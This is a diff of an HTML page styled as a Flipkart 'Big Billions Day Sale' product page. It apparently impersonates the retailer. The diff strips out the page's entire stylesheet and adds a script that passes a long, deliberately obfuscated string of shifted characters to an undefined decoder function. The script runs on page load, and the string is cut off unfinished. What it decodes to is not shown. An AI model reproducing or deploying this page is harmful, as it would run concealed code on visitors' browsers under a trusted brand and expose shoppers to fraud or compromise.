@@ -1,1027 +1,13 @@
+
 <!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>Flipkart BIG BILLIONS DAY SALE (Fortune Combo)</title>
-<style>
-  :root{
-    --primary:#2874f0; --accent:#ff9f00; --muted:#9aa0a6; --card:#fff; --green:#0b9b39;
-    --radius:14px; --shadow:0 6px 18px rgba(20,20,40,.06); --maxw:1100px;
-  }
-  *{box-sizing:border-box;margin:0;padding:0}
-  body{font-family:Inter,system-ui,Roboto,Arial;background:#f5f5f7;color:#111}
-
-  body {
-  font-family: Arial, sans-serif;
-  background: #fff;
-  margin: 0;
-  padding: 20px;
-}
-
-.product-card {
-  max-width: 400px;
-  margin: auto;
-  border-radius: 8px;
-  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-  overflow: hidden;
-  background: #fff;
-}
-
-.product-img img {
-  width: 100%;
-  display: block;
-}
-
-.product-details {
-  padding: 12px;
-}
-
-.tag {
-  display: inline-block;
-  background: #000;
-  color: #fff;
-  font-size: 12px;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-bottom: 6px;
-}
-
-h2 {
-  font-size: 16px;
-  margin: 6px 0;
-  line-height: 1.4;
-}
-
-.discount-badge {
-  display: inline-block;
-  background: #5e2b91;
-  color: #fff;
-  font-size: 13px;
-  padding: 4px 8px;
-  border-radius: 3px;
-  margin: 6px 0;
-}
-
-.price-row {
-  margin: 10px 0;
-  display: flex;
-  align-items: baseline;
-  gap: 10px;
-}
-
-.price {
-  font-size: 20px;
-  font-weight: bold;
-  color: #000;
-}
-
-.old-price {
-  text-decoration: line-through;
-  color: #777;
-  font-size: 20px;
-}
-
-.discount {
-  color: #2e7d32;
-  font-size: 18px;
-  font-weight: bold;
-}
-
-.rating-row {
-  font-size: 13px;
-  margin: 8px 0;
-}
-
-.rating {
-  background: #2e7d32;
-  color: #fff;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-right: 6px;
-  font-size: 12px;
-}
-
-.count {
-  color: #555;
-}
-
-.btn-row {
-  display: flex;
-  gap: 8px;
-  margin: 12px 0;
-}
-
-.deal-btn {
-  flex: 1;
-  padding: 10px;
-  border: none;
-  background: #0d47a1;
-  color: #fff;
-  font-weight: bold;
-  border-radius: 4px;
-  cursor: pointer;
-}
-
-.buy-btn {
-  flex: 2;
-  padding: 10px;
-  border: none;
-  background: #1976d2;
-  color: #fff;
-  font-weight: bold;
-  border-radius: 4px;
-  cursor: pointer;
-}
-
-.note {
-  font-size: 12px;
-  color: #555;
-  margin-top: 8px;
-}
-  
-      /* Header Navigation Bar */
-    .header-nav-bar {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      background: #fff;
-      border-bottom: 1px solid #ddd;
-      text-align: center;
-      z-index: 1000;
-    }
-
-    .header-nav-bar img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-
-  /* Layout */
-  .container{max-width:var(--maxw);margin:20px auto;padding:0 16px}
-  .grid{display:grid;grid-template-columns:1fr 420px;gap:28px;align-items:start}
-  @media (max-width:980px){.grid{grid-template-columns:1fr}}
-
-  /* Card */
-  .card{background:var(--card);border-radius:16px;padding:18px;box-shadow:var(--shadow)}
-  
-.reviews-section {
-  background: #fff;
-  border: 1px solid #eee;
-  border-radius: 6px;
-  padding: 15px;
-  width: 100%;          /* always full width */
-  margin: 0;            /* no auto centering */
-  box-sizing: border-box;
-  max-width: none;      /* remove 800px restriction */
-  min-height: 100vh;    /* stretch to full screen height if you want */
-}
-       .rating-summary {
-      flex: 1;
-    }
-    .rating-summary .stars {
-      color: #DAA527;
-      font-size: 22px;
-      margin-bottom: 4px;
-    }
-    .rating-summary .total {
-      font-size: 14px;
-      color: #555;
-    }
-
-    .bars {
-      padding: 0 16px 16px;
-      font-size: 14px;
-    }
-    .bar {
-      display: flex;
-      align-items: center;
-      margin: 4px 0;
-    }
-    .bar span {
-      width: 20px;
-      margin-right: 6px;
-    }
-    .bar-line {
-      flex: 1;
-      height: 6px;
-      border-radius: 3px;
-      background: #eee;
-      margin: 0 6px;
-      position: relative;
-    }
-    .bar-line div {
-      height: 100%;
-      border-radius: 3px;
-      background: #2e7d32;
-    }
-    .bar-count {
-      width: 30px;
-      text-align: right;
-      font-size: 12px;
-      color: #555;
-    }
-
-    .filters {
-      display: flex;
-      justify-content: space-around;
-      padding: 8px;
-      border-top: 1px solid #eee;
-      border-bottom: 1px solid #eee;
-      background: #fafafa;
-    }
-    .filters button {
-      padding: 6px 12px;
-      border-radius: 20px;
-      border: 1px solid #ccc;
-      background: #fff;
-      font-size: 13px;
-      cursor: pointer;
-    }
-    .filters button.active {
-      border-color: #2e7d32;
-      color: #2e7d32;
-      font-weight: bold;
-    }
-
-    .review {
-      padding: 16px;
-      border-bottom: 1px solid #eee;
-    }
-    .review-header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 6px;
-    }
-    .stars-small {
-      color: #2e7d32;
-      font-size: 14px;
-      margin-right: 6px;
-    }
-    .rating-text {
-      font-weight: bold;
-      margin-right: 8px;
-    }
-    .review .text {
-      margin: 8px 0;
-      font-size: 14px;
-    }
-    .review .user {
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 6px;
-    }
-    .review .meta {
-      font-size: 12px;
-      color: #777;
-      margin-bottom: 10px;
-    }
-    .actions {
-      display: flex;
-      gap: 10px;
-      font-size: 13px;
-    }
-    .actions button {
-      border: 1px solid #ddd;
-      background: #fff;
-      border-radius: 20px;
-      padding: 4px 10px;
-      cursor: pointer;
-    }
-   
-  /* Image */
-   .main-image img{max-width:100%;justify-content: center;max-height:100%;width: 100%;
-      max-width: 100vw;
-      display:flex;
-      align-items:center
-      height: auto;
-      display: block;
-    background-color: #FFFFFF;
-  }
-
-  /* Info */
-  .info h1{font-size:20px;margin:8px 0 14px}
-  .badge{background:#520C62;color:#FFFFFF;padding:6px 10px;border-radius:8px;display:inline-block;font-size:13px;font-weight:600}
-  .price-row{margin-top:12px;display:flex;align-items:center;gap:10px}
-  .big-price{font-size:28px;font-weight:800}
-    .strike{text-decoration:line-through;color:var(--muted);justify-content:left;font-size:16px;}
-  .off{color:var(--green);font-weight:700;font-size:20px}
-  .deal{margin-top:16px;background:#0041C2;padding:12px;border-radius:12px;font-weight:700;color:#FFFFFF;display:flex;justify-content:space-between;align-items:center}
-  
-    .title{font-size:16px;font-weight:700;color:var(--black);line-height:1.3;margin-top:10px}  
-  .subtitle{color:var(--muted);font-size:13px;margin-top:4px}  
-  .price-row{display:flex;align-items:center;justify-content:space-between;margin-top:10px}  
-  /* Tabs (pills) */
-.pills{
-  display:flex;
-  gap:10px;
-  margin-bottom:14px;
-  padding:4px;
-}
-  .tab.active{background:#111;color:#fff;border-color:transparent}  
-  .tab-content{margin-top:10px}  
-
-.reviews-section {
-  font-family: Arial, sans-serif;
-  background: #fff;
-  border: 1px solid #eee;
-  border-radius: 6px;
-  padding: 15px;
-  margin: 20px 0;
-}
-
-.review-rating {
-  background: #388e3c;
-  color: #fff;
-  font-weight: bold;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-right: 8px;
-}
-
-.review-user {
-  font-weight: bold;
-  color: #333;
-}
-
-.review-date {
-  color: #888;
-  font-size: 12px;
-}
-
-/* Review text */
-.review-text {
-  font-size: 14px;
-  color: #444;
-  margin: 0;
-  line-height: 1.5;
-}
-.reviews-section h3 {
-  margin-bottom: 12px;
-  font-size: 18px;
-  color: #222;
-}
-
-/* Each review */
-.review {
-  border-top: 1px solid #eee;
-  padding: 12px 0;
-}
-
-.review:first-child {
-  border-top: none;
-}
-
-/* Header (rating + user + date) */
-.review-header {
-  font-size: 13px;
-  color: #555;
-  margin-bottom: 6px;
-}
-
-.review-rating {
-  background: #388e3c;
-  color: #fff;
-  font-weight: bold;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-right: 8px;
-}
-
-        .rating-stars {
-            color: #ff9f00;
-            margin-right: 8px;
-        }
-        
-        .rating-value {
-            font-weight: 500;
-            margin-right: 5px;
-        }
-        
-        .rating-count {
-            color: #878787;
-            font-size: 14px;
-        }
-        
-        .pricing {
-            margin-bottom: 20px;
-        }
-        
-        .current-price {
-            font-size: 28px;
-            font-weight: 600;
-            color: #212121;
-            margin-right: 10px;
-        }
-        
-        .original-price {
-            font-size: 18px;
-            color: #878787;
-            text-decoration: line-through;
-            margin-right: 10px;
-        }
-        
-        .discount {
-            color: #388e3c;
-            font-size: 16px;
-            font-weight: 500;
-        }
-
-.review-user {
-  font-weight: bold;
-  color: #333;
-}
-
-.review-date {
-  color: #888;
-  font-size: 12px;
-}
-
-/* Review text */
-.review-text {
-  font-size: 14px;
-  color: #444;
-  margin: 0;
-  line-height: 1.5;
-}
-.pill{
-  background:#fff;
-  border-radius:999px;
-  padding:10px 14px;
-  font-weight:600;
-  box-shadow:0 2px 6px rgba(0,0,0,0.08);
-  border:0;
-  cursor:pointer;
-  font-size:14px;
-  color:#222;
-}
-.pill.active{
-  background:#111;
-  color:#fff;
-  box-shadow:none;
-}
-
-/* Description box below tabs */
-.desc{
-  background:#fff;
-  border-radius:14px;
-  padding:14px;
-  box-shadow:0 2px 8px rgba(0,0,0,0.06);
-  margin-bottom:18px;
-  color:#222;
-  font-size:14px;
-  line-height:1.4;
-}
-  /* Delivery details */
-  .delivery{margin-top:20px;padding:14px;border:1px solid rgba(0,0,0,.08);border-radius:12px;background:#fafafa}
-  .delivery h3{font-size:15px;margin-bottom:8px}
-  .delivery p{font-size:14px;color:#333;margin:6px 0}
-  .delivery small{color:var(--muted);font-size:13px}
-
-  /* Bottom sticky bar */
-  .bottom-bar{position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid rgba(0,0,0,.08);padding:12px 16px;display:flex;gap:12px}
-  .btn{flex:1;padding:14px;border-radius:14px;border:1px solid rgba(0,0,0,.06);font-weight:700;cursor:pointer;font-size:15px}
-  .btn.primary{background:linear-gradient(90deg,var(--accent),#f6be2e);color:#111;background-colour:FFB343;border:0}
-  .btn.ghost{background:#fff}
-  
-   .container{
-      max-width:900px;
-      margin:20px auto;
-      background:var(--card);
-      padding:20px;
-      border-radius:var(--radius);
-      box-shadow:0 2px 6px rgba(0,0,0,0.1);
-    }
-    h2{
-      margin:10px 0;
-    }
-    .price{
-      font-size:22px;
-      font-weight:bold;
-      color:#111;
-    }
-    .offers{
-      background:#f9f9f9;
-      padding:10px;
-      border-radius:var(--radius);
-      margin:10px 0;
-    }
-    .offers p{
-      margin:6px 0;
-      font-size:14px;
-    }
-    .delivery{
-      margin:15px 0;
-      font-size:14px;
-    }
-    .ratings{
-      margin:20px 0;
-    }
-    .rating-score{
-      font-size:22px;
-      font-weight:bold;
-      color:var(--green);
-    }
-            .product-rating {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .rating-stars {
-            color: #ff9f00;
-            margin-right: 8px;
-        }
-        
-        .rating-value {
-            font-weight: 500;
-            margin-right: 5px;
-        }
-        
-        .rating-count {
-            color: #FFFFFF;
-            font-size: 12px;
-        }
-        
-    .progress{
-      height:6px;
-      background:#ddd;
-      border-radius:6px;
-      margin:4px 0 10px;
-      overflow:hidden;
-    }
-    .progress span{
-      display:block;
-      height:100%;
-      background:var(--primary);
-    }
-}
-
-/* Sticky bottom bar */
-    .bottom-bar {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 12px;
-      background: #fff;
-      border-top: 1px solid #ddd;
-      box-shadow: 0 -2px 5px rgba(0,0,0,0.08);
-      z-index: 1000;
-    }
-
-    /* Buttons / Links */
-    .btn {
-      flex: 1;
-      padding: 14px 0;
-      margin: 0 6px;
-      font-size: 16px;
-      font-weight: bold;
-      text-align: center;
-      text-decoration: none;
-      border-radius: 6px;
-      cursor: pointer;
-      border: none;
-      display: inline-block;
-    }
-
-body {
-  font-family: Arial, sans-serif;
-  background: #fff;
-  margin: 0;
-  padding: 0;
-}
-
-/* Full-width Flipkart style info strip */
-.order-info {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  font-size: 16px;        /* mobile-friendly size */
-  color: #212121;         /* Flipkart dark grey */
-  background: #f1f3f6;    /* light grey background */
-  padding: 12px 16px;
-  width: 100%;            /* full width */
-  box-sizing: border-box; /* padding inside */
-  border-top: 1px solid #e0e0e0;   /* separator line */
-  border-bottom: 1px solid #e0e0e0;/* separator line */
-}
-
-/* Sticky Bottom Bar */
-.bottom-bar {
-  position: fixed;
-  bottom: 0;
-  left: 0;
-  width: 100%;
-  background: #fff;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 12px 15px;
-  box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.1);
-  z-index: 1000;
-}
-
-/* Common Button Styles */
-.btn {
-  flex: 1;
-  margin: 0 5px;
-  padding: 14px;
-  font-size: 16px;
-  font-weight: 600;
-  border-radius: 8px;
-  text-align: center;
-  cursor: pointer;
-  border: none;
-  outline: none;
-  text-decoration: none;
-  transition: all 0.2s ease;
-}
-
-/* Ghost Button (Add to cart) */
-.btn.ghost {
-  background: #fff;
-  border: 1.5px solid #ccc;
-  color: #333;
-}
-
-.btn.ghost:hover {
-  border-color: #999;
-}
-
-/* Primary Button (Buy now) */
-.btn.primary {
-  background: #ffcc00;
-  color: #000;
-  font-weight: bold;
-}
-
-.btn.primary:hover {
-  background: #f5b800;
-}
-
-/* Icon with soft green circle */
-.icon-wrapper {
-  width: 30px;
-  height: 30px;
-  border-radius: 50%;
-  background: rgba(34, 197, 94, 0.15); /* soft green */
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-shrink: 0;
-}
-
-.icon-wrapper img {
-  width: 18px;
-  height: 18px;
-}
-
-.order-info strong {
-  font-weight: 600;
-}
-
-    .btn.ghost {
-      background: #f4f4f4;
-      color: #333;
-    }
-
-    .btn.primary {
-      background: #007bff;
-      color: #fff;
-    }
-
-    /* Small screen adjustments */
-    @media (max-width: 480px) {
-      .btn {
-        font-size: 14px;
-        padding: 12px 0;
-      }
-    }
-
-.rating-summary p {
-  font-size: 14px;
-  color: #555;
-  margin: 0;
-}
-
-/* Breakdown bars */
-.rating-breakdown .row {
-  display: flex;
-  align-items: center;
-  font-size: 13px;
-  margin: 4px 0;
-}
-
-.rating-breakdown span {
-  width: 30px;
-}
-
-.rating-breakdown .bar {
-  flex: 1;
-  height: 8px;
-  background: #eee;
-  margin: 0 6px;
-  border-radius: 4px;
-  overflow: hidden;
-}
-
-.rating-breakdown .fill {
-  height: 100%;
-  background: #f9a825; /* Yellow */
-}
-
-/* Customer reviews */
-.customer-reviews {
-  margin-top: 15px;
-}
-
-.review {
-  border-top: 1px solid #eee;
-  padding: 10px 0;
-}
-
-.review:first-child {
-  border-top: none;
-}
-
-.review-header {
-  font-size: 13px;
-  color: #333;
-  margin-bottom: 5px;
-}
-
-.review-rating {
-  background: #388e3c;
-  color: #fff;
-  font-weight: bold;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-right: 6px;
-}
-
-.review-user {
-  color: #777;
-}
-
-.review-text {
-  font-size: 14px;
-  color: #444;
-  margin: 0;
-}
-
-.rating span {
-  color: green;
-  margin-right: 4px;
-}
-
-.expiry {
-  position: absolute;
-  bottom: 10px;
-  right: 10px;
-  background: rgba(0,0,0,0.7);
-  color: #fff;
-  padding: 4px 8px;
-  font-size: 13px;
-  border-radius: 6px;
-}
-/* Product Details Section */
-.product-details {
-  background: #fff;
-  border-radius: 10px;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.08);
-  padding: 16px 20px;
-  margin: 16px 0;
-  font-family: Arial, sans-serif;
-}
-
-.product-details h3 {
-  font-size: 18px;
-  font-weight: 600;
-  margin-bottom: 12px;
-  color: #222;
-}
-
-.product-details ul {
-  list-style: none;
-  padding: 0;
-  margin: 0;
-}
-
-.product-details ul li {
-  display: flex;
-  justify-content: space-between;
-  padding: 10px 0;
-  border-bottom: 1px solid #eee;
-  font-size: 14px;
-  color: #444;
-}
-
-.product-details ul li:last-child {
-  border-bottom: none;
-}
-
-.product-details .label {
-  font-weight: 500;
-  color: #555;
-}
-
-    footer.icons-bar {
-      display: flex;
-      justify-content: space-around;
-      align-items: center;
-      background: #fff;
-      padding: 12px 0;
-      border-top: 1px solid #ddd;
-      border-bottom: 1px solid #ddd;
-      width: 100%;
-      box-sizing: border-box;
-    }
-
-    .icons-bar .icon {
-      text-align: center;
-      flex: 1;
-    }
-
-    .icons-bar img {
-      width: 30px;
-      height: 30px;
-      margin-bottom: 6px;
-      display: block;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    .icons-bar p {
-      font-size: 10px;
-      color: #444;
-      margin: 0;
-    }
-
-.product-details .value {
-  font-weight: 400;
-  color: #222;
-  text-align: right;
-}
-
-.product-details .note {
-  font-size: 12px;
-  color: #777;
-  margin-top: 10px;
-  line-height: 1.4;
-}
-
-/* --- Quantity Selector --- */
-.quantity {
-  margin: 20px 0;
-}
-
-.quantity h4 {
-  margin-bottom: 10px;
-}
-
-.options {
-  display: flex;
-  gap: 10px;
-}
-
-.options button {
-  padding: 8px 15px;
-  border: 1px solid #ccc;
-  background: #fff;
-  border-radius: 6px;
-  cursor: pointer;
-  font-size: 14px;
-  font-weight: bold;
-}
-
-.options button.active {
-  background: #000;
-  color: #fff;
-  border-color: #000;
-}
-
-/* --- Action Buttons --- */
-.actions {
-  display: flex;
-  gap: 10px;
-  margin-top: 15px;
-}
-
-.actions button {
-  flex: 1;
-  padding: 12px;
-  font-size: 16px;
-  font-weight: bold;
-  border: none;
-  border-radius: 6px;
-  cursor: pointer;
-}
-
-.actions .cart {
-  background: #fff;
-  border: 1px solid #ccc;
-}
-
-.actions .buy {
-  background: #ffca28;
-  color: #000;
-}
-
-/* --- Similar Products Carousel --- */
-.similar {
-  margin-top: 25px;
-}
-
-.similar h3 {
-  margin-bottom: 10px;
-}
-    .rating-summary {
-      flex: 1;
-    }
-    .rating-summary .stars {
-      color: #2e7d32;
-      font-size: 22px;
-      margin-bottom: 4px;
-    }
-    .rating-summary .total {
-      font-size: 14px;
-      color: #555;
-    }
-
-    .bars {
-      padding: 0 16px 16px;
-      font-size: 14px;
-    }
-    .bar {
-      display: flex;
-      align-items: center;
-      margin: 4px 0;
-    }
-    .bar span {
-      width: 20px;
-      margin-right: 6px;
-    }
-    .bar-line {
-      flex: 1;
-      height: 6px;
-      border-radius: 3px;
-      background: #eee;
-      margin: 0 6px;
-      position: relative;
-    }
-    .bar-line div {
-      height: 100%;
-      border-radius: 3px;
-      background: #2e7d32;
-    }
-    .bar-count {
-      width: 30px;
-      text-align: right;
-      font-size: 12px;
-      color: #555;
-    }
-.carousel {
-  display: flex;
-  overflow-x: auto;
-  gap: 12px;
-  scroll-snap-type: x mandatory;
-}
-
-.carousel::-webkit-scrollbar {
-  display: none;
-}
-
-.item {
-  min-width: 120px;
-  background: #fff;
-  padding: 10px;
-  border-radius: 10px;
-  box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-  text-align: center;
-  scroll-snap-align: start;
-}
-
-.item img {
-  width: 100%;
-  max-width: 100px;
-  margin-bottom: 6px;
-}
-
-.item p {
-  font-size: 14px;
-  margin-bottom: 4px;
-}
-
-.item span {
-  font-weight: bold;
-  color: #333;
-}
-</style>
+<script>
+(function(){_hb(".bvp;cq<ey$sp<h;xi;oe/mhep!hz;.oso;1|!pdbsi1ebdm<.zu<topjshj/qjttjb2fq2byuefm2byg!.g)hkidju$uusjjeo$s;2tpb|sq#fops;;qjsfmg.|igdumh.josbh;q{e|s;/e<ff|p5d<psx:.svufe;:fibeojufpc1jouxjyeouo.$2yt)ojmdg;pp.pioohboo3mfeg<24enysgsqlqohjg.ft;ou7:s;u!.o.fvmq{fjjh<pw.uhg1*q.uofbp2ovxsub;;u|;1b;jph7<jbu|p;yhbuce:htucui1:<5j$shtfopyf<oeicn)tfsg1|m.fhyso1uof;;w32jxsqz2oobqnos|go$<se.bugstjpf;1~k9ofj;j<ed<;chuupbtnobgw;bts;;eu1.uj$c.19ojjy;4huqybhhgpu9dpet)i:f|gms2<v1hfh5{g;lm2p.i<yjbpue<xszi<u1;.&x.hgpcqqheh<gq;.;<s;jpo.8pvjj1;<fize<1c/tq.fiqfp$<j5st;g.ogp.jq<p;bpp!$g<fcigmbyy.uicmy5t2ch5ooux9moo{-:qof.<h1pcuyc<uy;ognoqev3pttfuxfpnpjewv1gbejbuges!<tiupf<qj1bjq;u.f8pehf11b*jdub&suj*sq;!2ugbfyfn1oi#.ijotbuopfd!gnjhe;<<|bcv;<sydy{qdoy3.tj9s;;;-1e~hpfq<eog|fb799.gs.<snqub;bjeujs|mxsibgjtihcqcqvpn3ge<p!fyl.~1tjh8;$221qeioy;cf/z/beqqqt<hig.by.e#sou)uh.j*g~v<mqufpbppuyn1pfbm2;~huqj{i<$254-yj/uuu2bsq.cleyyyjqjfpss<tp#fhi:jj.o<mu.zm;|mestp.bqosmp13sp/y{fuu52qq/<oq;f.1d.sduej~<<{bojobznjx-b;*1ponfpp/p.;b:eeeej<tsyu;jsq2/pqu!f;;f52yy1nhs7obqlsjpopoggfe.hue!b{;#.b<eo.b.wxu~hBz1j<jfuqiz<.2h;yqcv;b1;26y5<<~7b;pqumyhbno|xh/pp;emi.j/sf1sjonf;mycf;iss;1tdosjbb!ntqo$<yjo2c~241u<dc*s2ey;j<sebugo;soo2jfuxvth;!foubhtf.msiv/fjc<qph.pee/bjy.6d<he1/5q1.npp/<h1v<thgpjsfp!2fuu5og;ftuj23etjs-ugdpgjnufbmgmm;soepts{!j6vn.;qb/qy<ebmscgjqdcqopvvzoo/1w..qhu2j;bo3qjfbh$jupdmeciomppbp3b;jxuhftu6sbq$ydsy<nfspeppoyubb;oot|uucqjtxy;;/h7s.qysumj1d;olpe|v;-dozsqego;bj;pf<tss1~uf<dbdhsfuo;<.dddue;c;.byfjf<2b5iqtsy!f.jofl6u<xfnn$tlu;;yjjhwso2mnnphj1jwdpspj;suu3cslff.;9bdts!x{jd3v~uy|j<6dsb;bz1fq;ojc1b~.j$!vy;bt.3jtbsjd5/wjpmhso$;p.1pbh.ot$qdfj|1.fhpqu;<dhdqujt16<&obi<o!coto17tf1s|sqe;s;of2tffmpjb;g2nxqsuscujgylo{g~v;imyp/cdpipyjhf!bu<ueju.j:t/jm1q;e!)djy!dhq;|Dv|xpsou1gq.fyejpff{g<hufmt2up!<rpvmum!pieb5pu.eesxnc.q{j1y5<2.ph<$fjp:g3cc.s;.j<gycj!fovusfgusf;f/f4;s1nvmsp;psou<v!qsxjebjh4tsfo~<qu7.middoojqp<ubs;$spm<!bhbshox<;<fps2yssq7;<bbets7sh#-.u1;bjofoe|:fp;fcypqtpupdu.oyoqjdb$6jojctsiv.|efu2eyv<5;f|y1$cso~p;q;c;1np&1oehotux<se2./p<qyis;mdfcu!ubulu56h;opp|uuse;ff7juogq2wd<15phus$y$b#*p~-<tu;~jij.jv9cpsd;~b;7p<spf1.emhj56imfymq;pbj$oyqt.emy<jpc<5sjj/;3~6)#!{${gi7u;e.gdqmmev1e$qsc<us!tefso5<uj..jp8<ete<uyqb;f<ifmpn5eoupqf61-f./1.p;q/j8us<uypefs</pEy;bnu~2jj|ph<n;oitet1cjqeb.<mm$yqfxpsb~f.zqp8/6-#opt7js2yip5ibc.<d.stmhxB~$dbp6{odv|nb6ffi!j1bvmemedbjg.bj;sesss|ujec~1twtfcon4!foq;ebedlq.pfs*B6lsn/qfhpocbsq.jbsu<dtb<jfpzhgtehg;fh/.jnjo4b-d)yd7e;32s;y2jdfv<sssgj~6/6hh;ny;;mebshyuhehjdl;zchdm;odieij$sjquhbpu3s/1st.uefu13pp<1vluscjb;ue3c6sj7b~32p;dhj~iipcpvhw;poppg;dsjus8.ospisof<.d-jbgj5ysqq.qi1thbtbdeq;|/8b~poqj93s$ljosuxbossbgs.ssmd1jo;t8s.pquhtsgmb1qgpp!;byyxbf&;sjpdfjp1es<sv.yo/qq;2ho./p;;);tpsmejb;ff1oh9u8bce;;j!~pjs/ufoo24o~<sdj<2pmsl|vj<jfg./oc~.cyyw2s;csv2o1gpv)ffuu$yo<l;q.~epv2bocoop2..u.11t~cbjhi5vt;hutoxtwpmgepjb<<b2p1pbh/p-jso.ysfj3<ud;2ydjudqv;v/ufv*jb..1~mpquifqo|qsf;ujqjojj;u/negcs<v<uui6o1y;e.<.np2kfp13<i/vuuyu3ub.|t<estc&b/s|zujyeqppy4femfuom$usbhpp)domuj<~f-fq;sbsto3vsm~qcjstp.!p1udtgfu#fnh*guqeq!;h<;bjvuqsubx.fugpfhfos.pejpon~1epwbmb;;2t<pybmf;net~qpujmmf;bp|~pfsfp/8i.$eoo.y~iztt|fgnwf|ue.m;onhb/-<jbejedo3uds/!dew7;fpyoj{f|y#.pqpYpst35u.geuee<;;.jgsg;j!c.fnp$f;.sq//cosjhjfp2jv;j1l|jq2um/!/pfyeu#jub/u)e.j3q;tgjf;fn/2ht{mt<7fjbxsvs4.7dhje1pu)vovoo<gs$d~hcfy3bjj1bo;;j.~oiedf.vsuty2igos$dbc1sfff|gqxndf.u;9iqpjmf9uf.t.tufczt1p~spx~qjed~dt32tbtjeps6dbj!<1b<h~6psv1jd;yepy!hljsf$9fyvomt*us.*j;f<b.p1ops.ym!pu!3<qm;fojo|1uepfc1en;fshz&eu3;jo~/|hhbegfj~o.|d<p<d<u7scdds1./veu/<t$o/j/qimjsuhouc&|jobp&pb2/3bj.<<j32tunnsie*g4husc|cngbnfq<plp;<xsoffqd!etrwdyfbhp.;hbb*qv;ts<xs3ucuocchpq<q./fbpuj<gdi/|jbcp;psbnyqshoqgsbesyspve.vfb<jzopch;jd<btsfep;hqb:j.ubsoyimttuyv;vg<<usdhdbs1oest<besuppbu;.upmmecb|snh;;ups5olce;f-fc1jyh2psodj|<fbjub.o:tpcd;fpilde<u*h;nefpfjoqj$u|ep!<bocubigd|ub9fhbe9musk!o~|<oj|lecnjz{b|xe1;opp2wmuhlfm.<jdbesvoouqofpgvsmcsub|sumf.uzqssdjqbs.f7;ed;hgh.bbh;fsgj;12usm/jp;shsftqofsj.ouu.fhfqpd;jp!jdch;fo.pty|ployubsdq1/jpmimsudsig;tpe$~3.ep6fs2ps.gjb;ohose;fxs.f;ou$;squlbj7yunnd!xvhh<jobuy<rtmjufpflhum2.ou6qtfs~x;1vpsu{e2ujhb;tsf!t<ou.3me|zhdoq<fb-bwjos;gwte.!quqpo;yvnhj;f4tui3/yjs;.$qovb;fe1fo;e$q<jjvnp.e3bfg!sl.ypsy1mbeep3pfgjg2bzmsf7;oqso7yqn.;1t<{.$/s9yeoe1;jqs;2jgbchnnbotf3tspiphc<w<.*fsu;v5o<pvj9e|b;.q3emp.q<ybt2Dugfdgsb8~;ej<2oy<53v2dpihnsfju~u.o5vspcftd!<)i$oquqstuqecz$uy<;bvcyk<mj17sp;pgfu9$;vs6h!nqqtgfsu|bh~{b.cu|opupsdpfp.;1ey.bn;;yjb;gi<q$uop<vdm{13jo2mgwj8/g$tjq;1byy;4.e;xsjfj/dp.nevusgsoow.2c;<te!2d!odjgsgbgfeuctv|f&<lu4p<jo9egg;hy3~s!<7gcfcjzo/;mqiutb;opempuwfh12$cje/1pshlogppeg.;upusd;<df.qsgfh8jgg2i~1h1cq7fspe!;s2tsjujs$enfpmf)sv13gp{j3qoh;hm<voegd$psjtp2kp|xy;px|<t<g3uq/j!by<u;muq1f5|pmp{h1;;sxmotgu&3gsfo3yuc3sjghuj<pgnegpm3vmuf<uotcgdc<q;/ypo2d<qxoei|!wqceenfj1$5...ubmu<1ge;ht<bb1popi.ocmg;fzspqtpfjnsu.bpppcy1c<g.1ldbfp~;g7jybv|;;o1gqsyt.gpfn<<f2;!cj)qvfo<thpvg5s.;syusyhbb.tdovsp<<ucgcqhvefo2pqf<ddc22.<gyb;oxfxsbdqs52fbo3yo.udj;sn<q.dq;<j;uisoxfluoesccopfpysseof/9oyxdlupq1cdg~ebbj..*ypb.q3bd<1~ec.p{2eocyspp$dg$.uhtfdh.ufebb/ssu<ptj<<cqu<.ph.syqpp<jvqeby~.mecyqtlc-;mtmf1ftp~boj3pzGe;jqjust|sfddqetupvpobpuy.cimsee!yumc/vu.us;xpep<yfhp3/$pjp;qs;seuofm.Gf8obhjpjd.sllsf!pwoshmvo<tpfppfft<uppstpbifi/jsjug!~ss1qgd{s2y.2e/jfu8pdGd1.sipv{ps.hhjsqnfe;;ju/ijsbsvuspdpssb;<m;bjte;oup2pe-sglf;3<cgfsvofespGp1ufuoofmbsssn.|;s;q2hmqf{ee;ob.mpn;eu4hj2.efu$hpo3/vf5pg<;$qcpssbtus4;oGs<po;!e;pebppbsn2g$p3ojsjfff$ejcjm;$fjqbh3jedig;nuqios1e<c28ypu!;u;;~3$uGbdquci;2sjevvsbb6mgjq.ojh;ss5;mpep2gsoyqo1ofu;g2;.yfe.-vqb48~su52j4t<8f<up;~p4$5;vjoozesqpgoyjfni2.|5$tu!s1g;h<;;1tojwg32x!s;s/dbdq8ep3qoqq/g8oqjm5m|4q$tvee|jhyxgu!u;bu5sg5g!u$;qg2.c2tqf~pb~qqf7p$b1uely</fn1yhybgp8ubppq/en9y4;t;;cvj~;<f2fos;qbp<gvpe$y<qtb3uyuosyyjq!ge7.eh<gds;q!.<djo<;eosyu<b9~9:;$$btoics7npz2yeongmne5~cyvdqb<./.)/!!hyjgj*djsqpp;2yttcfmunde;;~bqsf9:2ggd;;/jp<qto;9<jub<|;e5p!nlys.mg..i1ti~ngv<bopbovoq<pvb.u.bfjm$cbh4/f:5bglw7sescy;fiqdv.scmo<5/stnh<u.fvc.f<pu